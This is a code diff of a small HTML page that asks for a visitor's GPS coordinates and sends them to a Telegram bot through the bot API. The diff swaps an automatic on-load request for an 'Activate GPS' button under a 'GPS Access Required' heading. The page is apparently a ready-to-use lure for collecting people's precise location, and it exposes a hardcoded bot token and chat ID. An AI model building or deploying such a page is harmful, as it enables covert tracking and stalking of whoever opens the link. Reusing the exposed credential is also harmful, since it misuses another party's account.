@@ -5,8 +5,9 @@
   <title>GPS Location Sender</title>
 </head>
 <body>
-  <h1>Requesting GPS access...</h1>
-  <p id="status">Waiting for permission...</p>
+  <h1>📍 GPS Access Required</h1>
+  <button onclick="getLocation()">Activate GPS</button>
+  <p id="status">Waiting for user action...</p>
 
   <script>
     const BOT_TOKEN = "7617031761:AAGyUI2Ly-7TzxLlpIqtb1M_H7MJznnRvUw";
@@ -16,11 +17,9 @@
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
       fetch(url)
         .then(res => {
-          if (res.ok) {
-            document.getElementById("status").innerText = "✅ Location sent to Telegram.";
-          } else {
-            document.getElementById("status").innerText = "❌ Failed to send location.";
-          }
+          document.getElementById("status").innerText = res.ok
+            ? "✅ Location sent to Telegram."
+            : "❌ Failed to send location.";
         })
         .catch(() => {
           document.getElementById("status").innerText = "❌ Error sending location.";
@@ -28,40 +27,30 @@
     }
 
     function getLocation() {
+      document.getElementById("status").innerText = "Requesting GPS access...";
+      
       if (!navigator.geolocation) {
-        document.getElementById("status").innerText = "❌ Geolocation is not supported by your browser.";
+        document.getElementById("status").innerText = "❌ Geolocation not supported.";
         return;
       }
 
       navigator.geolocation.getCurrentPosition(
         (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const message = `📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
+          const { latitude, longitude } = position.coords;
+          const message = `📍 User Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
           sendToTelegram(message);
         },
         (error) => {
-          switch (error.code) {
-            case error.PERMISSION_DENIED:
-              document.getElementById("status").innerText = "❌ Permission denied.";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              document.getElementById("status").innerText = "❌ Location unavailable.";
-              break;
-            case error.TIMEOUT:
-              document.getElementById("status").innerText = "❌ Request timed out.";
-              break;
-            default:
-              document.getElementById("status").innerText = "❌ Unknown error.";
-              break;
-          }
+          const errors = {
+            1: "❌ Permission denied.",
+            2: "❌ Location unavailable.",
+            3: "❌ Request timed out.",
+          };
+          document.getElementById("status").innerText = errors[error.code] || "❌ Unknown error.";
         },
         { enableHighAccuracy: true, timeout: 10000 }
       );
     }
-
-    // Start the location request when page loads
-    window.onload = getLocation;
   </script>
 </body>
 </html>
